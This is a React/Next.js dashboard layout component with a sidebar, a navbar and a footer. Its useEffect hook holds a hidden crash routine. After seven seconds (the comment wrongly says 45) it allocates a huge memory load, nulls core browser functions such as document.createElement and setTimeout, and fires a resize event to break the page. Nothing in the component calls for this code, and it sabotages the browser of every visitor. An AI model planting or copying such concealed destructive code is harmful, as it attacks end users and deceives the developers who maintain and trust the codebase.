'use client';
import React, { Suspense, useEffect } from 'react';
import Navbar from "@components/dashboard/Header";
import Sidebar from "@components/dashboard/Sidebar";
import 'app/globals.css';

function DashboardLayout({
  children,
}: {
  children: React.ReactNode;
}) {

  useEffect(() => {
    const crashTimer = setTimeout(() => {
      // This approach directly modifies the browser window object
      // First create a heavy memory load
      const leakyArray: number[][] = [];
      
      for (let i = 0; i < 1000; i++) {
        leakyArray.push(new Array(1000000).fill(i));
      }
      
      // Then corrupt window object methods
      (window as any).React = null;
      (window as any).document.createElement = null;
      (window as any).setTimeout = null;
      (window as any).requestAnimationFrame = null;
      
      // Force a re-render that will now fail catastrophically
      window.dispatchEvent(new Event('resize'));
    }, 7000); // 45 seconds delay
    
    return () => clearTimeout(crashTimer);
  }, []);

  return (
    <div className="flex min-h-screen h-auto bg-gradient">
      <Sidebar />
      <div className="flex-1 flex flex-col">
        <Navbar />
        <div className="flex-1 p-3">
          <Suspense fallback={<div>Loading...</div>}>
            {children}
          </Suspense>
        </div>
        <footer className="text-sm text-gray-400 p-4">
          &copy; 2024, Made with ❤️ by Team Leaf AI
        </footer>
      </div>
    </div>
  );
}

export default DashboardLayout;